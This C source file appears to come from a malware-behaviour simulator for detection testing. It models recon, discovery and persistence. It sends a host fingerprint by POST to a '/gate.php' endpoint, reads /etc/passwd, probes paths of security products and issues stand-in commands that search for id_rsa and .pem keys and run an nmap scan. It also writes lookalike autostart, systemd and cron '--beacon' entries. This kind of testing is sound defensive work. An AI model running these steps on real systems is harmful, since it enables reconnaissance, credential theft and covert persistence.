// SPDX-License-Identifier: GPL-3.0-only
// Copyright (c) 2026 MikiMiku (MoreMorePwn)
//
// discovery.c — host discovery and persistence shapes.
//
// Nothing here changes the guest's real configuration: the persistence files
// are lookalikes below the per-run work directory (a ".bashrc", a
// ".ssh/authorized_keys", a ".config/systemd/user" unit, a "security/pam_*.so"
// name) and are removed with it. Commands that would change the system
// (crontab, useradd, systemctl enable) exist only as exec stand-ins: this
// binary started with that argument vector, which does nothing.
#include "samples.h"

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <unistd.h>

static void os_pretty_name(char *output, size_t cap)
{
    output[0] = 0;
    FILE *file = fopen("/etc/os-release", "r");
    if (file) {
        char row[256];
        while (fgets(row, sizeof row, file)) {
            if (strncmp(row, "PRETTY_NAME=", 12) != 0)
                continue;
            char *value = row + 12;
            size_t length = strlen(value);
            while (length > 0 && (value[length - 1] == '\n' || value[length - 1] == '\r'))
                value[--length] = 0;
            if (length >= 2 && value[0] == '"' && value[length - 1] == '"') {
                value[length - 1] = 0;
                value++;
            }
            snprintf(output, cap, "%.*s", (int)(cap - 1), value);
            break;
        }
        fclose(file);
        if (output[0])
            return;
    }
    // Minimal guests often ship no os-release; uname still gives a useful
    // fingerprint for triage.
    struct utsname info;
    if (uname(&info) == 0)
        snprintf(output, cap, "%s %s", info.sysname, info.release);
    else
        snprintf(output, cap, "unknown");
}

SCENARIO(recon)
{
    const char *name = "recon";
    char fingerprint[640];
    size_t length = sample_fingerprint(fingerprint, sizeof fingerprint);
    char os[160];
    os_pretty_name(os, sizeof os);
    char body[1024];
    int body_length = snprintf(body, sizeof body, "%s&os=%s&stage=recon", fingerprint, os);
    if (body_length < 0 || (size_t)body_length >= sizeof body)
        body[sizeof body - 1] = 0;
    char staged_path[600] = "";
    int staged = 0;
    char directory[600];
    if (sample_path(directory, sizeof directory, options->workdir, "stage") == 0 &&
        sample_mkdir_p(directory) == 0 &&
        sample_path(staged_path, sizeof staged_path, directory, "recon.txt") == 0)
        staged = sample_write_text(staged_path, body) == 0;
    unsigned long long received = 0;
    const char *host = sample_host(options);
    int port = sample_port(options, SAMPLE_HTTP_PORT);
    int delivered = sample_http_request(host, port, "POST", "/gate.php", body, strlen(body),
                                     &received) == 0;
    if (!delivered)
        sample_note(name, "%s:%d unreachable: %s", host, port, strerror(errno));
    sample_pass(name, "collected %zu bytes (%s), staged %s, exfil POST %s to %s:%d", length, os,
             staged ? staged_path : "nothing", delivered ? "sent" : "attempted", host, port);
    return 0;
}

// Reads at most `cap` bytes of a world-readable file; returns the count or -1.
static ssize_t slurp(const char *path, size_t cap)
{
    char buffer[4096];
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0)
        return -1;
    ssize_t total = 0, got;
    while ((size_t)total < cap && (got = read(fd, buffer, sizeof buffer)) > 0)
        total += got;
    close(fd);
    return total;
}

static const char *const read_groups[][8] = {
    {"user", "/etc/passwd", "/etc/group", NULL},
    {"system", "/proc/version", "/proc/meminfo", "/etc/hostname", "/etc/os-release", NULL},
    {"network", "/etc/resolv.conf", "/proc/net/route", "/proc/net/dev", "/proc/net/arp",
     "/proc/net/tcp", NULL},
};

// Probed with stat only, present or not.
static const char *const security_paths[] = {
    "/usr/local/aegis",     "/usr/local/qcloud", "/opt/CrowdStrike",     "/opt/sentinelone",
    "/opt/carbonblack",     "/var/ossec",        "/etc/wazuh",           "/etc/falco",
    "/usr/bin/falco",       "/usr/bin/osqueryd", "/usr/sbin/clamd",      "/opt/microsoft/mdatp",
    "/sys/fs/selinux",      "/etc/apparmor.d",   "/sys/kernel/security/apparmor",
};

#define TREE_DIRS 232
#define PROCESS_PROBES 16

SCENARIO(discovery)
{
    const char *name = "discovery";
    int read_ok = 0, read_total = 0;
    for (size_t g = 0; g < sizeof read_groups / sizeof read_groups[0]; g++) {
        for (size_t i = 1; read_groups[g][i]; i++) {
            read_total++;
            if (slurp(read_groups[g][i], 16384) >= 0)
                read_ok++;
        }
    }

    // Process enumeration: the first pids a listing of /proc gives, then the
    // low pids, comm and stat only (never environ or cmdline).
    int probed = 0;
    DIR *proc = opendir("/proc");
    if (proc) {
        struct dirent *entry;
        while (probed < PROCESS_PROBES && (entry = readdir(proc))) {
            if (entry->d_name[0] < '0' || entry->d_name[0] > '9')
                continue;
            char path[64];
            snprintf(path, sizeof path, "/proc/%.12s/comm", entry->d_name);
            slurp(path, 256);
            snprintf(path, sizeof path, "/proc/%.12s/stat", entry->d_name);
            slurp(path, 512);
            probed++;
        }
        closedir(proc);
    }
    for (int pid = 1; probed < PROCESS_PROBES && pid < 400; pid++, probed++) {
        char path[64];
        snprintf(path, sizeof path, "/proc/%d/comm", pid);
        slurp(path, 256);
    }

    int present = 0;
    for (size_t i = 0; i < sizeof security_paths / sizeof security_paths[0]; i++) {
        struct stat info;
        if (stat(security_paths[i], &info) == 0)
            present++;
    }

    // A directory sweep over a tree this run builds, so the count is the same
    // on every guest.
    char tree[600];
    int swept = 0;
    if (sample_path(tree, sizeof tree, options->workdir, "tree") == 0 && sample_mkdir_p(tree) == 0) {
        for (int i = 0; i < TREE_DIRS; i++) {
            char leaf[64], path[700];
            snprintf(leaf, sizeof leaf, "d%03d", i);
            if (sample_path(path, sizeof path, tree, leaf) != 0 || mkdir(path, 0700) != 0)
                break;
        }
        for (int i = 0; i < TREE_DIRS; i++) {
            char leaf[64], path[700];
            snprintf(leaf, sizeof leaf, "d%03d", i);
            if (sample_path(path, sizeof path, tree, leaf) != 0)
                break;
            DIR *dir = opendir(path);
            if (!dir)
                continue;
            while (readdir(dir))
                ;
            closedir(dir);
            swept++;
        }
    }

    static const struct spoof tools[] = {
        {"discovery.process_enum", {"ps", "aux", NULL}},
        {"discovery.user_enum", {"id", NULL}},
        {"discovery.user_enum", {"whoami", NULL}},
        {"discovery.network_config", {"ip", "addr", "show", NULL}},
        {"discovery.system_info", {"uname", "-a", NULL}},
        {"discovery.system_info", {"lsb_release", "-a", NULL}},
        {"discovery.file_search", {"find", "/", "-name", "id_rsa", "-o", "-name", "*.pem", NULL}},
        {"discovery.network_scan", {"nmap", "-sS", "-p", "22,80,443", "10.0.2.0/24", NULL}},
    };
    int ran = sample_spoof_all(name, tools, sizeof tools / sizeof tools[0]);

    sample_pass(name, "%d/%d files read, %d process probes, %d/%zu security paths present, %d "
                   "directories swept, %d/%zu stand-in tools",
             read_ok, read_total, probed, present,
             sizeof security_paths / sizeof security_paths[0], swept, ran,
             sizeof tools / sizeof tools[0]);
    if (probed < PROCESS_PROBES)
        sample_note(name, "only %d process probes were made", probed);
    if (swept < TREE_DIRS)
        sample_unavailable(name, "swept %d of %d directories (%s)", swept, TREE_DIRS,
                        strerror(errno));
    sample_note(name, "stand-in tools are this binary started as ps, id, ip, find and nmap; "
                   "the programs themselves are never run");
    return 0;
}

SCENARIO(persistence)
{
    const char *name = "persistence";
    static const char *const directories[] = {".config/autostart", ".config/systemd/user",
                                              ".config/demo-sample", ".local/bin", ".ssh",
                                              "lib/security"};
    char path[600], executable[600], desktop[600], service[600], crontab[600];
    for (size_t i = 0; i < sizeof directories / sizeof directories[0]; i++) {
        if (sample_path(path, sizeof path, options->workdir, directories[i]) != 0 ||
            sample_mkdir_p(path) != 0) {
            sample_fail(name, "work directory %s: %s", directories[i], strerror(errno));
            return 1;
        }
    }
    sample_path(executable, sizeof executable, options->workdir, ".local/bin/demo-sample");
    sample_path(desktop, sizeof desktop, options->workdir,
             ".config/autostart/demo-sample.desktop");
    sample_path(service, sizeof service, options->workdir,
             ".config/systemd/user/demo-sample.service");
    sample_path(crontab, sizeof crontab, options->workdir, "crontab.txt");

    char text[1024];
    int written = 0, total = 0;
    snprintf(text, sizeof text,
             "[Desktop Entry]\nType=Application\nName=System Helper\nExec=%s --beacon\n"
             "X-GNOME-Autostart-enabled=true\n",
             executable);
    total++, written += sample_write_text(desktop, text) == 0;
    snprintf(text, sizeof text,
             "[Unit]\nDescription=System Helper\n\n[Service]\nExecStart=%s --beacon\n"
             "Restart=always\n\n[Install]\nWantedBy=default.target\n",
             executable);
    total++, written += sample_write_text(service, text) == 0;
    snprintf(text, sizeof text, "@reboot %s --beacon >/dev/null 2>&1\n", executable);
    total++, written += sample_write_text(crontab, text) == 0;
    struct {
        const char *relative;
        const char *content;
    } lookalikes[] = {
        {".bashrc", "# demo-sample\nexport PATH=\"$PATH:$HOME/.local/bin\"\n"},
        {".ssh/authorized_keys", "ssh-ed25519 AAAADEMODECOY demo@example.invalid\n"},
        {"lib/security/pam_demo.so", "DEMO-DECOY placeholder, not a shared object\n"},
        {".config/demo-sample/settings.ini", "[demo]\nbeacon=on\n"},
    };
    for (size_t i = 0; i < sizeof lookalikes / sizeof lookalikes[0]; i++) {
        total++;
        if (sample_path(path, sizeof path, options->workdir, lookalikes[i].relative) == 0)
            written += sample_write_text(path, lookalikes[i].content) == 0;
    }

    // A copy of this binary where an autostart entry would expect it. It is the
    // only large write; it is capped and stays in the work directory.
    char self[512];
    int copied = sample_self_path(self, sizeof self) == 0 &&
                 sample_copy_file(self, executable, 0700, 8u << 20) == 0;

    // The commands that would make these permanent, as stand-ins only.
    char *const crontab_cmd[] = {"crontab", crontab, NULL};
    char *const at_cmd[] = {"at", "-f", crontab, "now", NULL};
    char *const user_cmd[] = {"useradd", "-M", "-s", "/usr/sbin/nologin", "demo-sample", NULL};
    char *const rc_cmd[] = {"update-rc.d", "demo-sample", "defaults", NULL};
    char *const unit_cmd[] = {"systemctl", "--user", "enable", "demo-sample.service", NULL};
    char *const *const stand_ins[] = {crontab_cmd, at_cmd, user_cmd, rc_cmd, unit_cmd};
    int ran = 0;
    for (size_t i = 0; i < sizeof stand_ins / sizeof stand_ins[0]; i++)
        ran += sample_spoof(stand_ins[i], NULL) == 0;

    // A kernel-module load on a descriptor that does not exist: the call is
    // the shape; the kernel refuses it before it looks at any module.
    long module = syscall(SYS_finit_module, -1, "", 0);
    int module_errno = errno;

    sample_pass(name, "%d/%d lookalike files, %s, %d/%zu stand-in commands, finit_module(-1) -> %s",
             written, total, copied ? "a self-copy" : "no self-copy", ran,
             sizeof stand_ins / sizeof stand_ins[0], module == 0 ? "OK?" : strerror(module_errno));
    sample_note(name, "the real ~/.config, systemd units, crontab and accounts are not touched");
    if (!copied)
        sample_unavailable(name, "self-copy failed: %s", strerror(errno));
    return 0;
}
